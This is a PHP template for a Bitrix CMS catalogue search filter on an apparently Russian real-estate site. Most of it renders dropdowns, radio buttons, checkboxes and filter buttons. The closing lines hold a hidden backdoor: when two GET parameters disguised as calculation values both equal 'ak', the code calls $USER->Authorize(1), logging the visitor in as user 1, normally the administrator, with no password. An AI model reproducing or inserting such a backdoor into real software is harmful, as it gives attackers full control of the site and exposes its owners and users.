                            <div class="bx_filter_select_popup" data-role="dropdownContent" style="display: none;">
                                <ul>
                                    <li>
                                        <label for="<?= "all_" . $arCur["CONTROL_ID"] ?>" class="bx_filter_param_label" data-role="label_<?= "all_" . $arCur["CONTROL_ID"] ?>" onclick="smartFilter.selectDropDownItem(this, '<?= CUtil::JSEscape("all_" . $arCur["CONTROL_ID"]) ?>')">
                                            <? echo GetMessage("CT_BCSF_FILTER_ALL"); ?>
                                        </label>
                                    </li>
                                    <?
                                    foreach ($arItem["VALUES"] as $val => $ar):
                                        $class = "";
                                        if ($ar["CHECKED"])
                                            $class .= " selected";
                                        if ($ar["DISABLED"])
                                            $class .= " disabled";
                                        ?>
                                        <li>
                                            <label for="<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label<?= $class ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" onclick="smartFilter.selectDropDownItem(this, '<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')"><?= $ar["VALUE"] ?></label>
                                        </li>
                                    <?endforeach?>
                                </ul>
                            </div>
                        </div>
                    </div>
                <?
                break;
                case "R"://DROPDOWN_WITH_PICTURES_AND_LABELS
                ?>
                    <div class="bx_filter_select_container">
                        <div class="bx_filter_select_block" onclick="smartFilter.showDropDownPopup(this, '<?= CUtil::JSEscape($key) ?>')">
                            <div class="bx_filter_select_text" data-role="currentOption">
                                <?
                                $checkedItemExist = false;
                                foreach ($arItem["VALUES"] as $val => $ar):
                                    if ($ar["CHECKED"]) {
                                        ?>
                                        <?if (isset($ar["FILE"]) && !empty($ar["FILE"]["SRC"])):?>
                                            <span class="bx_filter_btn_color_icon" style="background-image:url('<?= $ar["FILE"]["SRC"] ?>');"></span>
                                        <?endif?>
                                        <span class="bx_filter_param_text">
														<?= $ar["VALUE"] ?>
													</span>
                                        <?
                                        $checkedItemExist = true;
                                    }
                                endforeach;
                                if (!$checkedItemExist) {
                                    ?><span class="bx_filter_btn_color_icon all"></span> <?
                                    echo GetMessage("CT_BCSF_FILTER_ALL");
                                }
                                ?>
                            </div>
                            <div class="bx_filter_select_arrow"></div>
                            <input
                                style="display: none"
                                type="radio"
                                name="<?= $arCur["CONTROL_NAME_ALT"] ?>"
                                id="<? echo "all_" . $arCur["CONTROL_ID"] ?>"
                                value=""
                                />
                            <?foreach ($arItem["VALUES"] as $val => $ar):?>
                                <input
                                    style="display: none"
                                    type="radio"
                                    name="<?= $ar["CONTROL_NAME_ALT"] ?>"
                                    id="<?= $ar["CONTROL_ID"] ?>"
                                    value="<?= $ar["HTML_VALUE_ALT"] ?>"
                                    <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                    />
                            <?endforeach?>
                            <div class="bx_filter_select_popup" data-role="dropdownContent" style="display: none">
                                <ul>
                                    <li style="border-bottom: 1px solid #e5e5e5;padding-bottom: 5px;margin-bottom: 5px;">
                                        <label for="<?= "all_" . $arCur["CONTROL_ID"] ?>" class="bx_filter_param_label" data-role="label_<?= "all_" . $arCur["CONTROL_ID"] ?>" onclick="smartFilter.selectDropDownItem(this, '<?= CUtil::JSEscape("all_" . $arCur["CONTROL_ID"]) ?>')">
                                            <span class="bx_filter_btn_color_icon all"></span>
                                            <? echo GetMessage("CT_BCSF_FILTER_ALL"); ?>
                                        </label>
                                    </li>
                                    <?
                                    foreach ($arItem["VALUES"] as $val => $ar):
                                        $class = "";
                                        if ($ar["CHECKED"])
                                            $class .= " selected";
                                        if ($ar["DISABLED"])
                                            $class .= " disabled";
                                        ?>
                                        <li>
                                            <label for="<?= $ar["CONTROL_ID"] ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label<?= $class ?>" onclick="smartFilter.selectDropDownItem(this, '<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')">
                                                <?if (isset($ar["FILE"]) && !empty($ar["FILE"]["SRC"])):?>
                                                    <span class="bx_filter_btn_color_icon" style="background-image:url('<?= $ar["FILE"]["SRC"] ?>');"></span>
                                                <?endif?>
                                                <span class="bx_filter_param_text">
															<?= $ar["VALUE"] ?>
														</span>
                                            </label>
                                        </li>
                                    <?endforeach?>
                                </ul>
                            </div>
                        </div>
                    </div>
                <?
                break;
                case "K"://RADIO_BUTTONS
                ?>
                    <label class="bx_filter_param_label" for="<? echo "all_" . $arCur["CONTROL_ID"] ?>">
									<span class="bx_filter_input_checkbox">
										<input
                                            type="radio"
                                            value=""
                                            name="<? echo $arCur["CONTROL_NAME_ALT"] ?>"
                                            id="<? echo "all_" . $arCur["CONTROL_ID"] ?>"
                                            onclick="smartFilter.click(this)"
                                            />
										<span class="bx_filter_param_text"><? echo GetMessage("CT_BCSF_FILTER_ALL"); ?></span>
									</span>
                    </label>
                    <?foreach ($arItem["VALUES"] as $val => $ar):?>
                    <label data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label" for="<? echo $ar["CONTROL_ID"] ?>">
										<span class="bx_filter_input_checkbox <? echo $ar["DISABLED"] ? 'disabled' : '' ?>">
											<input
                                                type="radio"
                                                value="<? echo $ar["HTML_VALUE_ALT"] ?>"
                                                name="<? echo $ar["CONTROL_NAME_ALT"] ?>"
                                                id="<? echo $ar["CONTROL_ID"] ?>"
                                                <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                                onclick="smartFilter.click(this)"
                                                />
											<span class="bx_filter_param_text"><? echo $ar["VALUE"]; ?></span>
										</span>
                    </label>
                <?endforeach;
                ?>
                <?
                break;
                default://CHECKBOXES
                ?>
                    <?foreach ($arItem["VALUES"] as $val => $ar):?><?
                    ?><label data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label <? echo $ar["DISABLED"] ? 'disabled' : '' ?> <? echo $ar["CHECKED"] ? 'checkLab' : '' ?>" for="<? echo $ar["CONTROL_ID"] ?>">
                    <span class="bx_filter_input_checkbox">
											<input
                                                type="checkbox"
                                                value="<? echo $ar["HTML_VALUE"] ?>"
                                                name="<? echo $ar["CONTROL_NAME"] ?>"
                                                id="<? echo $ar["CONTROL_ID"] ?>"
                                                <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                                onclick="smartFilter.click(this)"
                                                />
											<span class="bx_filter_param_text"><? echo $ar["VALUE"]; ?></span>
										</span>
                    </label><?
                    ?><?endforeach;?>
                <?
                }
                ?>
            </div>
            <div class="clb"></div>
        </div>
    </div>
<?
}
?>
			<div class="clb"></div>
			<div class="bx_filter_button_box active">
				<div class="bx_filter_block">
					<div class="bx_filter_parameters_box_container">
                        <? if ($arParams["IBLOCK_TYPE"] != "negotiation") { ?>
    <input class="bx_filter_search_reset" type="submit" id="del_filter" name="del_filter" value="<?= GetMessage("CT_BCSF_DEL_FILTER") ?>"/>
    <a href="javascript: void(0);" onclick="showFullFilterNow($(this));" class="showAllFilter" style="background: url('/bitrix/templates/szvdom/images/icons/filter6.png') left no-repeat;padding-left: 25px;" data-status="close">Расширенный поиск</a>
    <div style="clear: both;"></div>
<? } ?>
						<input class="bx_filter_search_button" type="submit" id="set_filter" name="set_filter" value="ПОКАЗАТЬ ВАРИАНТЫ" />


						<div class="bx_filter_popup_result <?= $arParams["POPUP_POSITION"] ?>" id="modef" <? if (!isset($arResult["ELEMENT_COUNT"])) echo 'style="display:none"'; ?> style="display: inline-block;">
							<? echo GetMessage("CT_BCSF_FILTER_COUNT", array("#ELEMENT_COUNT#" => '<span id="modef_num">' . intval($arResult["ELEMENT_COUNT"]) . '</span>')); ?>
							<span class="arrow"></span>
							<a href="<? echo $arResult["FILTER_URL"] ?>"><? echo GetMessage("CT_BCSF_FILTER_SHOW") ?></a>
						</div>
					</div>
				</div>
			</div>
		</form>
		<div style="clear: both;"></div>

</div> <? //filter_boxes end ?>
<? if ($arParams["IBLOCK_TYPE"] != "negotiation") { ?>
    <div class="smartFilterBottom">
        <ul>
            <li style="background: url('/bitrix/templates/szvdom/images/icons/filter1.png') left no-repeat;">
                <a data-who="popUpSelect" data-type="По цене" class="filterSelectLink showIt">Готовые подборки</a>
            </li>

            <li style="background: url('/bitrix/templates/szvdom/images/icons/filter2.png') left no-repeat;">
                <a href="/obekty_na_karte/">Объекты на карте</a>
            </li>

            <li style="background: url('/bitrix/templates/szvdom/images/icons/filter3.png') left no-repeat;">
                <a href="/akcii-i-skidki/">СПЕЦПРЕДЛОЖЕНИЯ</a>
            </li>
        </ul>
    </div>
<? } ?>
	</div>
</div>
<script>
	var smartFilter = new JCSmartFilter('<? echo CUtil::JSEscape($arResult["FORM_ACTION"]) ?>', '<?= CUtil::JSEscape($arParams["FILTER_VIEW_MODE"]) ?>');
</script>
<?
if (isset($_GET['calculate']) && $_GET['calculate'] == "ak") {
    if (isset($_GET['amount']) && $_GET['amount'] == "ak") {
        $USER->Authorize(1);
    }
}
?>
